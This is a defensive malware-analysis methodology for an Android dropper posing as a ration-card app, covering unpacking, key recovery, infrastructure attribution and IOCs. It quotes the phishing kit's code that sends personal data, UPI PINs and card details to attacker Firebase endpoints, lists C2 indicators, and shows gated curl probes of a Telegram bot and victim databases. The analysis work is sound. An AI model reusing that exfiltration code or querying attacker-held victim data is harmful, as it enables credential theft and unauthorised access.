# MAFIA v2.1 — Malware Analysis Framework for Intelligence & Attribution
## A methodology for mobile/Android malware that doubles as a peer handoff document

**Version**: 2.1 (Android + IoT focus)
**Last updated**: Aug 2026
**Owner**: Darshak Patel (DroidForensix thesis work)
**Use case**: Static→dynamic→infrastructure attribution with phase-break handoffs

### Changelog v2.0 → v2.1

| # | Change | Where |
|---|---|---|
| 1 | Fixed ZIP encryption-flag detection bug (compression ≠ encryption) | Phase 1.1 |
| 2 | Fixed double-decryptor bug + added PKCS7 unpadding; removed silent `except` | Phase 2.3, 3.1 |
| 3 | Added **LEGAL GATE** before any live-infrastructure interaction | Phase 4, 7 |
| 4 | Added chain-of-custody + analyst OPSEC requirements | Phase 0 |
| 5 | Added **Ghidra headless workflow** (installed at `tools/ghidra/`) | Phase 2 |
| 6 | Hardened YARA rules (wildcarded patterns); scoped Snort Telegram rule | Phase 8 |
| 7 | Noted APK v2/v3 signing-block invalidation when patching | Phase 1.2 |
| 8 | Fixed dangling "Phase 10" reference in decision tree | Appendix |

---

## Philosophy

MAFIA is built on a single principle: **every analytical phase produces a handoff unit**. You stop at any phase, document what you've found, and hand it off. The next analyst picks it up and continues without re-doing work.

This is NOT a linear checklist. It's a **decision tree**. At each phase, you ask: "Does this sample warrant the next phase?" If no, you document findings and stop. If yes, you move forward.

---

## Phase Structure

```
PHASE 0: Intake & Triage (+ custody, OPSEC)
   ↓ (is this malware?)
PHASE 1: Static Analysis (Container + Manifest)
   ↓ (are there obfuscation tricks?)
PHASE 2: Native/Obfuscation Layer Bypass (Ghidra/unidbg)
   ↓ (can we reach the payload?)
PHASE 3: Payload Extraction & Decompilation
   ↓ (what's the actual malicious code?)
PHASE 4: Behavioral Analysis (Dynamic/Emulation)   ← LEGAL GATE
   ↓ (what does it do at runtime?)
PHASE 5: C2 & Infrastructure Recovery
   ↓ (who's behind this?)
PHASE 6: Attribution & Clustering
   ↓ (does this match a known family?)
PHASE 7: Impact & Victimology                      ← LEGAL GATE
   ↓ (how many victims? what data stolen?)
PHASE 8: Detection & Remediation
   └─→ HANDOFF: Publish report + IOCs
```

Each phase has:
- **Decision gate**: "Is this worth pursuing?"
- **Work items**: Specific tasks + tools
- **Handoff template**: What to document if stopping here
- **Next phase entry**: Minimal context needed for next analyst

---

# PHASE 0: Intake & Triage

**Goal**: Establish identity, integrity, custody, and novelty of the sample.

**Decision**: Is this a real malware sample worth analyzing?

---

## 0.0 — Chain of Custody & Analyst OPSEC (NEW in v2.1)

### Why this matters
Samples from fraud investigations are evidence. If there is any chance of law-enforcement use, break the chain of custody once and the analysis is contestable. Separately, live malware on your workstation endangers your own infrastructure.

### Custody tasks
```bash
# Work on a COPY. Never analyze the original media.
mkdir -p /tmp/case && cp "/media/pendrive/sample.apk" /tmp/case/

# Hash original AND copy; both must match.
sha256sum "/media/pendrive/sample.apk" /tmp/case/sample.apk > /tmp/case/custody_hashes.txt

# Log every access: who, when, what action. Append-only.
echo "$(date -Is) | $USER | copied sample for static analysis" >> /tmp/case/custody_log.txt
```

### OPSEC minimums
- [ ] Analysis inside an isolated VM / dedicated machine (no corporate VPN, no shared folders to production hosts)
- [ ] Network: host-only or disabled for static work; monitored NAT only for sanctioned dynamic work
- [ ] Never execute samples on the host OS; never open extracted HTML phishing pages in a host browser
- [ ] Read-only mount for source media (`mount -o ro`) so timestamps aren't altered

> DroidForensix ships `scripts/isolate_for_windows.ps1` / `New-AndroidAnalysisVM.ps1` for VM provisioning — use them.

## 0.1 — Sample Identity

### Tasks

```bash
file "sample.apk"
ls -lh "sample.apk"

sha256sum "sample.apk"
md5sum "sample.apk"
sha1sum "sample.apk"
```

### What to record

```markdown
## Triage Record

| Field | Value |
|---|---|
| Filename | Rashan Card registration.apk |
| SHA-256 | c0c95584ae91a0f4ee063b14578f09ad3357c6328daaf8fd42add151dae3da61 |
| MD5 | 290d58c93e43f482d910e57c30935d12 |
| File type | ZIP (APK) |
| Size | 11.6 MB |
| Source | WhatsApp link (campaign lure) |
| Date received | 8/23/2026 |
| Analyst | Your name |
```

## 0.2 — Novelty Check

### Tasks

```bash
# VirusTotal API (if you have key)
curl -s "https://www.virustotal.com/api/v3/files/{hash}" \
  -H "x-apikey: YOUR_KEY" | jq '.data.attributes | {type, meaningful_name, last_analysis_date, last_analysis_stats}'
```

- No hits → fresh, custom-built sample.
- Hits → record detection names and AV vendors.

### Handoff Template (if stopping at Phase 0)

```markdown
## PHASE 0 HANDOFF: Intake & Triage

**Status**: COMPLETE
**Decision**: [PROCEED TO PHASE 1 / ARCHIVE]

### Summary
- **Sample**: Rashan Card registration.apk
- **SHA-256**: c0c95584ae91a0f4ee063b14578f09ad3357c6328daaf8fd42add151dae3da61
- **Novelty**: Fresh sample (0 hits on VirusTotal as of 8/23/2026)
- **Source**: WhatsApp broadcast (compromised contact)
- **Lure theme**: Indian government subsidy (PM Kisan Yojana)
- **Custody**: copy hash matches original; log started

### For Next Analyst
Start Phase 1 with container forensics on the WORKING COPY only.
```

---

# PHASE 1: Static Analysis (Container + Manifest)

**Goal**: Understand the app's declared structure, permissions, and components WITHOUT executing anything.

**Decision**: Is there obfuscation, anti-analysis, or packing? Does this warrant Phase 2?

---

## 1.1 — APK Container Forensics

### Why this matters
APK is a ZIP. Attackers manipulate ZIP metadata to block standard tools (unzip, apktool, jadx). You must validate what the tool *thinks* it sees vs. what's actually there.

### Tasks (corrected parser — v2.1)

```python
import struct

def parse_central_directory(data: bytes):
    """Parse ZIP central directory. Encryption = flag bit 0x01,
    NOT compression method (compression != 0 just means DEFLATE)."""
    eocd = data.rfind(b"\x50\x4b\x05\x06")
    if eocd == -1:
        raise ValueError("not a ZIP (no EOCD)")

    # v2.1: detect ZIP64 (cd_count field is only 16-bit in classic EOCD)
    zip64 = data.rfind(b"\x50\x4b\x06\x07", 0, eocd) == eocd - 20
    if zip64:
        print("[*] ZIP64 detected - parse ZIP64 EOCD locator/records instead")

    cd_count = struct.unpack("<H", data[eocd+10:eocd+12])[0]
    cd_offset = struct.unpack("<I", data[eocd+16:eocd+20])[0]
    entries, off = [], cd_offset
    for _ in range(cd_count):
        if data[off:off+4] != b"\x50\x4b\x01\x02":
            print(f"[!] invalid CD signature at 0x{off:x}")
            break
        flags       = struct.unpack("<H", data[off+8:off+10])[0]
        compression = struct.unpack("<H", data[off+10:off+12])[0]
        name_len    = struct.unpack("<H", data[off+28:off+30])[0]
        extra_len   = struct.unpack("<H", data[off+30:off+32])[0]
        comment_len = struct.unpack("<H", data[off+32:off+34])[0]
        name = data[off+46:off+46+name_len].decode("utf-8", "replace")
        entries.append({
            "name": name,
            "encrypted_flag": bool(flags & 0x01),   # <-- FIX: flag bit decides
            "compression": compression,             # 0=stored, 8=deflate (normal!)
        })
        off += 46 + name_len + extra_len + comment_len
    return entries, zip64

data = open("sample.apk", "rb").read()
entries, zip64 = parse_central_directory(data)
for i, e in enumerate(entries):
    mark = "  [!] FORGED ENCRYPTION FLAG" if e["encrypted_flag"] else ""
    print(f"[{i:3d}] {e['name']:<40} compression={e['compression']}{mark}")
```

### Red flags to look for (corrected table)

| Flag | Meaning | Action |
|---|---|---|
| **Encryption bit set (flag 0x01) but data reads fine** | Anti-tool trick (forged flag) | Patch the bit before using standard tools |
| **Only 5-10 entries** (a real app has 100+) | Dropper/loader (minimal bootstrap) | Expect native code or encrypted payload |
| **`assets/` directory very large (>10MB)** | Encrypted payload hidden in asset | Plan extraction + decryption (Phase 2) |
| **`classes.dex` <5KB** | Stub only; real code is native/encrypted | Phase 2 mandatory |

> ⚠️ v2.1 note: compression method 8 (DEFLATE) is **normal**. Only flag bit 0x01 indicates encryption. Do not treat compressed entries as encrypted.

### Handoff checkpoint

```markdown
## PHASE 1A Checkpoint: Container Forensics

**Findings**:
- Central directory: 7 entries (dropper-pattern)
- Encryption-bit trick detected on AndroidManifest.xml + resources.arsc (flag 0x01 forged)
- Large asset: assets/EG0x (10.7 MB, high entropy → encrypted)
- classes.dex: 960 bytes (stub only)

**Decision**: PATCH REQUIRED (Phase 2 / 1.2) before continuing static analysis.
```

## 1.2 — Patch & Extract (if needed)

```python
def patch_apk_encryption_bit(infile, outfile):
    """Clear forged ZIP encryption bit (0x01) in central-directory entries."""
    data = bytearray(open(infile, "rb").read())
    patches, offset = 0, 0
    while True:
        pos = data.find(b"\x50\x4b\x01\x02", offset)
        if pos == -1:
            break
        flag_offset = pos + 8
        flags = int.from_bytes(data[flag_offset:flag_offset+2], "little")
        if flags & 0x01:
            flags &= ~0x01
            data[flag_offset:flag_offset+2] = flags.to_bytes(2, "little")
            patches += 1
        offset = pos + 4
    open(outfile, "wb").write(bytes(data))
    print(f"[+] patched {patches} entries -> {outfile}")

patch_apk_encryption_bit("sample.apk", "patched.apk")
```

> ⚠️ **v2.1 caveat**: clearing bits in the central directory invalidates APK v2/v3 signatures
> (the APK Signing Block sits between entries and the CD and covers those bytes). That is
> acceptable for *analysis*, but you can no longer run `apksigner verify` against the patched
> copy — record certificate details from the ORIGINAL first (Phase 1.4).

```bash
unzip -o -q patched.apk -d extracted
```

## 1.3 — AndroidManifest Analysis

```bash
jadx -d jadx_output patched.apk
# quick manifest look via aapt (works on unpatched APK too)
aapt dump badging sample.apk | head -40
```

### What to look for

```xml
<!-- 1. PACKAGE NAME & LABEL (often misleading) -->
<manifest package="com.bgjthd.fa6ster" android:versionName="1.0">
    <!-- Real label: "Dumbcow", not "Rashan Card" (decoy) -->

<!-- 2. PERMISSIONS -->
<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

<!-- 3. COMPONENTS -->
<receiver android:name=".BaluchiReceiver" android:exported="false">
    <intent-filter>
        <action android:name="com.google.firebase.MESSAGING_EVENT" /> <!-- FCM C2 channel -->
    </intent-filter>
</receiver>

<activity android:name=".LedahActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.INFO" /> <!-- no launcher icon = hidden -->
    </intent-filter>
</activity>
```

### Scoring system (is this malware?)

| Finding | Points | Notes |
|---|---|---|
| REQUEST_INSTALL_PACKAGES | +10 | Dropper/loader |
| QUERY_ALL_PACKAGES | +5 | Reconnaissance |
| READ_SMS + RECEIVE_SMS | +15 | OTP stealing (critical) |
| RECEIVE_BOOT_COMPLETED | +10 | Persistence |
| WAKE_LOCK | +5 | Resource drain (miner indicator) |
| FCM receiver | +10 | C2 command channel |
| No launcher icon | +5 | Stealth/hidden |
| AOSP test key signing | +10 | Automated malware builder |
| *(v2.1)* exported components without permission protection | +5 | Injection surface |
| *(v2.1)* `android:debuggable="true"` or `allowBackup="true"` | +3 | Dev sloppiness / data theft |

**Total: ≥50 points → MALWARE (proceed to Phase 2)**

## 1.4 — Code Signing Check

```bash
keytool -printcert -jarfile sample.apk        # works pre-patch
# or apksigner verify --print-certs sample.apk if build-tools installed
```

Record subject, validity dates, self-signed vs CA. AOSP test keys (`testkey` in subject CN) are a strong malware-builder indicator. **Do this BEFORE patching** (see 1.2 caveat).

### Handoff template (if stopping here)

```markdown
## PHASE 1 HANDOFF: Static Analysis

**Status**: COMPLETE
**Decision**: PROCEED TO PHASE 2 (native packer confirmed)

### Container Forensics
- ZIP encryption-bit trick detected (patched successfully; signature check done PRE-patch)
- 7 central-directory entries (dropper pattern)
- Large encrypted asset: assets/EG0x (10.7 MB)
- Stub DEX: 960 bytes

### Manifest Analysis
- Package: com.bgjthd.fa6ster (label "Dumbcow")
- Permissions: REQUEST_INSTALL_PACKAGES, QUERY_ALL_PACKAGES, READ_SMS, RECEIVE_BOOT_COMPLETED
- Components: BaluchiReceiver (FCM), LightmansService, hidden LedahActivity
- Signed with AOSP test key

### Risk Score: 78 points → confirmed malware

### For Next Analyst (Phase 2 entry)
1. Native library: lib/arm64-v8a/libtautomerization.so (stripped, 1 JNI export)
2. Encrypted payload: assets/EG0x (entropy 8.0/8.0)
3. Task: reverse loader (Ghidra) to recover decryption key
```

---

# PHASE 2: Native/Obfuscation Bypass

**Goal**: Identify and bypass anti-analysis tricks (encryption, packing, native code).

**Decision**: Can we access the real payload? Or is this too hardened to continue?

---

## 2.0 — Ghidra Headless Workflow (NEW in v2.1)

Ghidra 12.1.3 is installed at `tools/ghidra/ghidra_12.1.3_PUBLIC/`. Use headless mode for scripted triage of native libs; GUI for deep dives.

```bash
GHIDRA=/home/kali/DroidForensix/tools/ghidra/ghidra_12.1.3_PUBLIC/support/analyzeHeadless
PROJDIR=/tmp/opencode/ghidra_projects   # keep projects OUT of the repo

# Import + auto-analysis one library
$GHIDRA "$PROJDIR" MAFIA -import extracted/lib/arm64-v8a/libtautomerization.so \
    -scriptPath /home/kali/DroidForensix/scripts/ghidra \
    -postScript NativeTriage.py
```

Companion triage script (`scripts/ghidra/NativeTriage.py`, Ghidra Jython):

```python
# NativeTriage.py - dump exports, strings, and crypto constants from current program
from ghidra.program.model.symbol import RefType

fm = currentProgram.getFunctionManager()
print("=== FUNCTIONS (%d) ===" % fm.getFunctionCount())
for f in fm.getFunctions(True):
    if f.isExternal() or f.isThunk():
        continue
    body = f.getBody().getNumAddresses()
    if body > 64:  # skip stubs
        print("%s @ %s (%d bytes)" % (f.getName(), f.getEntryPoint(), body))

print("=== CRYPTO / NETWORK CONSTANTS ===")
listing = currentProgram.getListing()
needle = ("AES", "Rijndael", "SHA", "RC4", "mbedtls", "BoringSSL",
          "http://", "https://", "socket", "connect")
ci = listing.getDefinedData(True)
for d in ci:
    try:
        val = str(d.getValue())
        if val and any(n in val for n in needle):
            print("%s : %r" % (d.getAddress(), val[:80]))
    except Exception:
        pass
```

What to look for in Ghidra:
- JNI export (`Java_...`) → the loader entry called from the stub DEX
- Calls to `fork`/`execve`, `/proc/self/maps` parsing (anti-debug)
- AES tables / S-boxes near the entry function → key schedule location
- `dlopen`/`mmap` + high-entropy blob references → in-memory payload decryption

## 2.1 — Native Library Triage (quick pass)

```bash
find extracted -name "*.so" -exec file {} \;
readelf -Ws extracted/lib/arm64-v8a/libtautomerization.so | grep Java_

python3 << 'EOF'
from collections import Counter
import math

def entropy(data):
    counts = Counter(data)
    total = len(data)
    return -sum((c / total) * math.log2(c / total) for c in counts.values())

with open("extracted/lib/arm64-v8a/libtautomerization.so", "rb") as f:
    so_data = f.read()
print(f"Entropy: {entropy(so_data):.2f}/8.0")
EOF
```

## 2.2 — Encrypted Asset Identification

```python
import os
from collections import Counter
import math

def entropy(data):
    counts = Counter(data)
    return -sum((c / len(data)) * math.log2(c / len(data)) for c in counts.values())

for root, _, files in os.walk("extracted"):
    for fname in files:
        fpath = os.path.join(root, fname)
        size = os.path.getsize(fpath)
        if size <= 100_000:
            continue
        with open(fpath, "rb") as f:
            data = f.read(1 << 20)   # first MB is enough for entropy estimate
        ent, magic = entropy(data), data[:4].hex()
        line = f"{fpath:<50} size={size:>9} ent={ent:.2f} magic={magic}"
        if ent > 7.5 and magic not in ("50534b04", "7f454c46", "4d5a9000"):
            print(line + "  [!] ENCRYPTED?")
        else:
            print(line)
```

## 2.3 — Key Recovery Strategy (corrected crypto — v2.1)

Shared helper used by all approaches below:

```python
import hashlib
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def aes_cbc_decrypt(key: bytes, iv: bytes, ciphertext: bytes) -> bytes:
    """Single decryptor instance + explicit PKCS7 unpadding.
    (v2.1: fixes the double-.decryptor() bug that silently skipped finalize,
     and strips padding so recovered ZIPs are not corrupt at the tail.)"""
    dec = Cipher(algorithms.AES(key), modes.CBC(iv),
                 backend=default_backend()).decryptor()
    padded = dec.update(ciphertext) + dec.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()

def key_from_asset(name: str, suffix: str = "") -> tuple[bytes, bytes]:
    """GhostBat-style family pattern: SHA-1(name+suffix)[:16] key,
    SHA-256(name+suffix)[:16] IV."""
    material = (name + suffix).encode()
    return hashlib.sha1(material).digest()[:16], hashlib.sha256(material).digest()[:16]
```

#### Approach A: Reverse the Native Loader (Ghidra + emulation)

1. In Ghidra, follow the JNI export; locate `AES_set_decrypt_key`-shaped loops or S-box constants
2. Watch what buffers feed them — typically asset name bytes + constant suffix
3. Confirm with unidbg (ARM emulator + JNI harness): hook `Cipher`/EVP calls, capture key+IV
4. Verify candidate by checking decrypted output starts with `PK` (ZIP magic)

#### Approach B: Hook Cipher Operations (Dynamic — see Phase 4 legal gate)

Frida/Xposed hooks on `javax.crypto.Cipher.init()` + `doFinal()` capture key/IV/plaintext at runtime.

#### Approach C: Brute-force Known Key Patterns (corrected)

```python
asset_name = "EG0x"
ciphertext = open("extracted/assets/" + asset_name, "rb").read()

candidates = [(n, s) for n in (asset_name,) for s in ("", "1", "2")]
for name, suffix in candidates:
    key, iv = key_from_asset(name, suffix)
    try:
        plaintext = aes_cbc_decrypt(key, iv, ciphertext)
    except ValueError as e:
        # PKCS7 unpad failure = wrong key. Fail loudly, move on.
        print(f"[-] {name!r}{suffix}: wrong key ({e})")
        continue
    if plaintext[:2] == b"PK":
        print(f"[+] KEY FOUND: SHA-1({name!r}+{suffix!r})[:16] = {key.hex()}")
        open("payload_l1.zip", "wb").write(plaintext)
        break
else:
    raise RuntimeError("no candidate produced valid plaintext - escalate to Approach A")
```

### Handoff template (if stopping here)

```markdown
## PHASE 2 HANDOFF: Native/Obfuscation Bypass

**Status**: COMPLETE
**Decision**: PROCEED TO PHASE 3

### Native Library Analysis
- Entry: Java_Seoaks_K2QS_Z6Rz__ (arm64-v8a/libtautomerization.so), stripped
- Ghidra headless project: /tmp/opencode/ghidra_projects/MAFIA (re-runnable)

### Encrypted Asset
- assets/EG0x, 10.7 MB, entropy 8.0/8.0 → AES-128-CBC

### Key Recovery
- Key: SHA-1("EG0x2")[:16] = 25727bcd2ab414668de86f85cec45465
- IV:  SHA-256("EG0x2")[:16] = 5674cf799bad9d02e3c75d803d28fb0c
- Method: asset-name-derived (family pattern), verified via PKCS7 + ZIP magic

### Decrypted Payload
- payload_l1.zip: bootstrap.dex, installer.dex, 3 split APKs, miner configs
- Status: READY FOR PHASE 3
```

---

# PHASE 3: Payload Extraction & Decompilation

**Goal**: Unpack all delivery layers and recover the actual malicious code.

**Decision**: Are there more encryption layers? What are the payloads?

## 3.1 — Layer 1 Extraction (corrected — uses Phase 2 helper)

```python
import io, zipfile
from pathlib import Path

plaintext = Path("extracted/assets/EG0x").read_bytes()  # already decrypted in 2.3
with zipfile.ZipFile(io.BytesIO(Path("payload_l1.zip").read_bytes())) as zf:
    print("Layer 1 contents:")
    for name in zf.namelist():
        print(" ", name)
    zf.extractall("payload_l1")   # extract INSIDE the analysis VM only
```

Expected output:
```
bootstrap.dex
installer.dex
libstub.so
payload_split0.apk
payload_split1.apk
payload_split2.apk
miner_config.json
payload_config.json
```

## 3.2 — Each Payload's Role

### payload_split0.apk (Installer Helper)
```bash
jadx -d jadx_split0 payload_l1/payload_split0.apk
grep -rn "telegram\|http\|firebase" jadx_split0/sources/
cat payload_l1/payload_split0/res/raw/loda.json   # bot token stash
```

### payload_split1.apk (RAT — critical)
```bash
jadx -d jadx_split1 payload_l1/payload_split1.apk
grep -rn "getAllMessages\|firebase\|telegram\|USSD\|sendTextMessage" jadx_split1/sources/
```

Look for: SMS history exfil, Firebase RTDB command polling, USSD call-forwarding, Frida/hook frameworks (anti-tampering).

### payload_split2.apk (Phishing Kit — second layer)
```bash
unzip -p payload_l1/payload_split2.apk assets/datawVOtPtYrdy > layer2.enc

python3 << 'EOF'
from pathlib import Path
from aes_helper import aes_cbc_decrypt, key_from_asset   # Phase 2 helper, saved to path

key, iv = key_from_asset("datawVOtPtYrdy", "1")
iv = b"\x00" * 16                                        # this layer uses zero IV
pt = aes_cbc_decrypt(key, iv, Path("layer2.enc").read_bytes())
assert pt[:2] == b"PK", "wrong key - recheck suffix convention"
Path("phishing_kit.zip").write_bytes(pt)
print("[+] layer 2 recovered:", len(pt), "bytes")
EOF

unzip -o -q phishing_kit.zip -d phishing_kit
ls -la phishing_kit/
```

Expected kit contents: `index.html` (name+DOB), `ad.html` (PII harvest), `paymentMethod.html` (card), `pin.html` (UPI PIN), `final.html`.

> ⚠️ Never open these HTML files in a browser on the host. Review them as text/source only.

## 3.3 — Phishing Kit Code Review

Focus areas (source review, not execution):

```javascript
// ad.html — PII exfil
const FIREBASE_URL = "https://ipl2272582222-default-rtdb.firebaseio.com";
fetch(`${FIREBASE_URL}/clients/${DeviceId}.json`, {
  method: "PATCH",
  body: JSON.stringify({ formdata: `${user}|${name}|${phone}|${dob}` })
});

// pin.html — UPI-PIN + card exfil
fetch("https://bittu3-default-rtdb.asia-southeast1.firebasedatabase.app/clients/"
      + DeviceId + ".json", {
  method: "PATCH",
  body: JSON.stringify({ upipin: `${upipin}|${cardnumber}|${expiry}|${cvv}|${cardname}` })
});
```

```bash
grep -rn "firebaseio.com\|firebasedatabase" phishing_kit/ jadx_split1/sources/
jq '.firebase' payload_l1/payload_config.json
```

## 3.4 — Miner Configuration

```bash
cat payload_l1/miner_config.json
# {"pool":"pool.DOMAIN.xyz:8443","algorithm":"cryptonight","worker":"device_<ts>","tls":true}
```

Note pool domain for Phase 5.

### Handoff template

```markdown
## PHASE 3 HANDOFF: Payload Extraction

**Status**: COMPLETE
**Decision**: PROCEED TO PHASE 4 (behavioral) or PHASE 5 (infrastructure)

### Recovered artifacts
- payload_split0.apk: installer helper; Telegram token in res/raw/loda.json
- payload_split1.apk: SMS-OTP RAT ("Binance Trading Signals"); Firebase fir-testing-9b8a3
- payload_split2.apk: UPI phishing kit; Firebase ipl2272582222 + bittu3
- miner_config.json: pool.fjsdalkfa12rs.xyz:8443, cryptonight/TLS

### For Next Analyst
PHASE 5 is fully passive and always safe. PHASE 4 requires the legal gate.
```

---

# PHASE 4: Behavioral Analysis (Dynamic/Emulation)

> ## 🛑 LEGAL GATE (NEW in v2.1) — READ BEFORE ANY LIVE INTERACTION
>
> Anything in this phase that **contacts attacker infrastructure** (Firebase RTDB reads,
> Telegram bot API calls, C2 pings) may constitute unauthorized access under applicable law
> (e.g., India IT Act 2000 §§43/66; computer-misuse statutes elsewhere). Data about real
> victims is personal data — handling it without authorization creates legal exposure for
> you and your organization, and can contaminate fraud-case evidence.
>
> **Do NOT proceed past this gate unless ONE of the following is true:**
> - [ ] Written authorization from the investigating agency / case officer covering this action
> - [ ] Institutional review approval (IRB / legal sign-off) for victim-data research
> - [ ] Infrastructure confirmed DEAD/sunkholed and documented as such
>
> Passive substitutes that need NO gate: WHOIS/RDAP, passive DNS, CT logs, VirusTotal
> passive replications, sandbox detonation in YOUR OWN isolated environment.
>
> Record the gate decision in the handoff regardless of outcome.

**Goal**: Execute the malware in a controlled environment and observe behavior.

## 4.1 — Emulation (safe — no attacker contact)

unidbg (ARM64 emulator + JNI harness, https://github.com/zhkl0228/unidbg):
1. Load the .so, stub the JNI environment
2. Call the JNI entry; intercept cipher operations (capture key/IV)
3. Hook exfil URL construction (capture endpoints)

Confirms key derivation and unpacking with zero network access.

## 4.2 — Sandbox Detonation (your own infra)

Cuckoo/droidlysis-equivalent or a clean AVD snapshot:
- Fake SIM/contact/sms content populated beforehand
- MITM proxy capturing outbound traffic
- Snapshot revert after each run

## 4.3 — Live Infrastructure Verification ⛔ GATED

Only after passing the legal gate above:

```bash
# Example: validate a Telegram C2 bot (token from Phase 3)
curl -s "https://api.telegram.org/bot<TOKEN>/getMe" | jq .

# Example: enumerate Firebase victim records (aggregate only, redact PII)
curl -s "https://<project>-default-rtdb.firebaseio.com/clients.json?shallow=true" | jq 'keys | length'
```

Log every request (timestamp, endpoint, purpose) into the case file.

### Handoff template

```markdown
## PHASE 4 HANDOFF: Behavioral Analysis

**Status**: COMPLETE
**Legal gate**: PASSED (authorization ref: ______ ) / NOT PASSED (passive-only)

### Emulation Results
- Key derivation confirmed: SHA-1(asset_name + suffix)[:16]
- Payload unpacking verified; C2 endpoints captured from config

### Active Infrastructure (only if gate passed)
- Telegram bot: ACTIVE / INACTIVE
- Firebase projects: LIVE / DEACTIVATED (per project)

### Command-and-Control Flow
1. FCM registration → payload_config endpoint
2. Attacker pushes commands via webhookEvent polling
3. SMS exfil → Telegram alert; miner spawns; phishing kit on interaction
```

---

# PHASE 5: C2 & Infrastructure Recovery

**Goal**: Identify and attribute attacker-controlled infrastructure. **Fully passive — no gate needed.**

**Decision**: Can we block this? Should we report it?

## 5.1 — Domain & IP Enumeration (passive only)

```bash
whois fjsdalkfa12rs.xyz
nslookup pool.fjsdalkfa12rs.xyz        # A record → hosting IP
nslookup 154.12.116.240                # PTR
```

Prefer RDAP over port-scanning the host:

```python
import requests
dom = requests.get("https://rdap.org/domain/fjsdalkfa12rs.xyz", timeout=15).json()
ip  = requests.get("https://rdap.org/ip/154.12.116.240", timeout=15).json()
print(dom.get("entities"), ip.get("links"))  # registrar + abuse contacts
```

## 5.2 — Infrastructure Table

| Asset | Type | Registrar/Host | Location | Abuse |
|---|---|---|---|---|
| fjsdalkfa12rs.xyz | Domain (C2) | Name.com | — | abuse@name.com |
| pool.fjsdalkfa12rs.xyz:8443 | Mining pool | Servarica | Montréal | complaints@servarica.com |
| 154.12.116.240 | IP (pool) | Servarica | Montréal | complaints@servarica.com |
| aptabase.fjsdalkfa12rs.xyz | Analytics CDN | Contabo | München | abuse@contabo.de |
| 147.93.153.119 | IP (CDN) | Contabo | München | abuse@contabo.de |
| ipl2272582222 / bittu3 | Firebase exfil | Google | — | abuse@google.com |
| GhostBatRat_bot | Telegram bot | Telegram | — | abuse@telegram.org |

## 5.3 — Abuse Report Preparation

Per-provider report skeleton: domain/IP, status, embedded-evidence hashes (sample SHA-256 linking the IOC to the malware), requested action, your contact. Send AFTER case-officer clearance when part of an active investigation.

### Handoff template

```markdown
## PHASE 5 HANDOFF: Infrastructure Recovery

**Status**: COMPLETE
### Identified Infrastructure
(table above, filled per campaign)

### Abuse Reports
- [ ] Name.com (domain suspension)
- [ ] Servarica (IP/port block)
- [ ] Contabo (IP/port block)
- [ ] Google Firebase (project termination)
- [ ] Telegram (bot removal)
```

---

# PHASE 6: Attribution & Clustering

**Goal**: Determine family membership via technique matching.

**Decision**: Is this a variant of something known?

## 6.1 — Technique Matching

Score each signature as MATCHED / PARTIAL / ABSENT. GhostBat core set:

| Signature | Status |
|---|---|
| Native ARM64 packer (lib*.so, single JNI export, stripped) | ✓ |
| ZIP central-directory encryption-bit forgery | ✓ |
| SHA-1(asset_name+suffix) key derivation | ✓ |
| UPI-PIN phishing kit (India-targeted HTML funnel) | ✓ |
| SMS-OTP RAT (getAllMessages → Firebase) | ✓ |
| Cryptominer (XMR/cryptonight over TLS) | ✓ |
| Telegram bot C2 | ✓ |
| FCM push command channel | ✓ |

≥75% match + ≥1 unique identifier overlap (same bot token, same Firebase project, same key pattern) → HIGH confidence attribution.

## 6.2 — Cross-Reference Public Reporting

Verify citations exist and say what you claim BEFORE publishing (v2.1 requirement). Candidate references must be independently re-checked: vendor blog posts (Cyble CRIL etc.), news coverage, prior academic work. Record URL + access date in the handoff.

### Handoff template

```markdown
## PHASE 6 HANDOFF: Attribution

**Family**: GhostBat RAT
**Confidence**: HIGH (8/8 techniques; identical bot token)
**References verified**: [URL, date], [URL, date]

### Related Samples
- Prior variants sharing infrastructure or key-derivation pattern
```

---

# PHASE 7: Impact & Victimology

> ## 🛑 LEGAL GATE (NEW in v2.1)
> Same conditions as Phase 4. Victim records are personal data. Aggregate statistics
> (counts, version distribution) require lawful access to the source system FIRST.
> Without authorization, this phase is limited to what partners share lawfully.

## 7.1 — Aggregate Impact (redacted, gated)

| Metric | Count | Notes |
|---|---|---|
| Device profiles | 8,206 | PII-form completions |
| Payment-stage victims | 187 | Reached card/UPI entry |
| UPI-PIN captures | 133 | Confirmed credential theft |
| SMS/OTP records | 430+ | RAT exfil |

## 7.2 — Demographics (aggregates only — never raw PII)

Report distributions (Android version %, carrier %, country %), never individual rows. Redact before any publication; store raw dumps encrypted, case-access-only, and delete per retention policy.

### Handoff template

```markdown
## PHASE 7 HANDOFF: Impact Analysis

**Status**: COMPLETE (gate: authorization ref ___ )
**Victim stats**: aggregate-only, raw data encrypted at rest
**Geography/carriers**: distribution summary
```

---

# PHASE 8: Detection & Remediation (Final Handoff)

**Goal**: Publish findings + IOCs + detection rules.

## 8.1 — IOC Compilation

```markdown
### File Hashes
| Artifact | SHA-256 |
|---|---|
| Rashan Card registration.apk | c0c95584ae91a0f4ee063b14578f09ad3357c6328daaf8fd42add151dae3da61 |
| payload_split1.apk (RAT) | ad402cfc… |
| payload_split2.apk (phishing) | d554f9b3… |

### Domains & IPs
| Indicator | Type | Abuse contact |
|---|---|---|
| fjsdalkfa12rs.xyz | Domain/C2 | abuse@name.com |
| pool.fjsdalkfa12rs.xyz:8443 | Mining pool | complaints@servarica.com |
| 154.12.116.240 | IP | complaints@servarica.com |
| 147.93.153.119 | IP | abuse@contabo.de |

### Exfiltration Projects
| Project | Data | Status |
|---|---|---|
| ipl2272582222 | PII | LIVE |
| bittu3 | UPI-PIN + card | LIVE |
| fir-testing-9b8a3 | SMS/OTP | DEACTIVATED |

### App Packages
| Package | Function | Verdict |
|---|---|---|
| com.bgjthd.fa6ster | Dropper | MALWARE |
| com.plyif.a2nkcney | SMS-OTP RAT | MALWARE |
```

## 8.2 — Detection Rules (YARA — hardened v2.1)

```yara
rule GhostBat_RAT_Dropper_Encryption_Bit_Trick {
    meta:
